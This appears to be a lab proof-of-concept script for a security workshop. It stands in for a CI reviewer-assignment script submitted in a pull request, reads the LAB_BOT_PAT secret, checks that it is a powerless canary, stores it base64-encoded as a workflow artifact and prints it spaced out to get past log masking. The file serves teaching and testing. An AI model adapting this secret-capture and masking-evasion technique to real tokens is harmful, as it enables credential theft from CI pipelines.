"use strict";

// Controlled lab payload. It writes only the powerless LAB_BOT_PAT canary to
// the staging directory uploaded by the trusted workflow. It performs no
// network requests and does not inspect any other runner data.
const fs = require("node:fs");
const path = require("node:path");

const canary = process.env.LAB_BOT_PAT;
if (!canary) {
  throw new Error("LAB_BOT_PAT was not available to the PR-controlled process.");
}
const canaryPrefixes = ["BSIDESCLE-2026-CANARY-", "BSIDES-2026-CANARY-"];
if (!canaryPrefixes.some((p) => canary.startsWith(p)) || !canary.endsWith("-NO-PRIVILEGES")) {
  throw new Error("Safety stop: LAB_BOT_PAT is not in the required powerless-canary format.");
}

const outputDirectory = path.join(process.cwd(), "lab-output");
fs.mkdirSync(outputDirectory, { recursive: true });
fs.writeFileSync(
  path.join(outputDirectory, "canary-proof.json"),
  JSON.stringify(
    {
      source: "PR-controlled .github/scripts/assign-reviewers.js",
      encoding: "base64",
      capturedCanary: Buffer.from(canary, "utf8").toString("base64"),
      warning: "This value is a nonfunctional lab canary, not a credential.",
    },
    null,
    2,
  ),
);

console.log("Captured the approved lab canary into the workflow artifact staging directory.");
console.log("canary_b64=" + Buffer.from(canary, "utf8").toString("base64").replace(/../g, (x) => x + " "));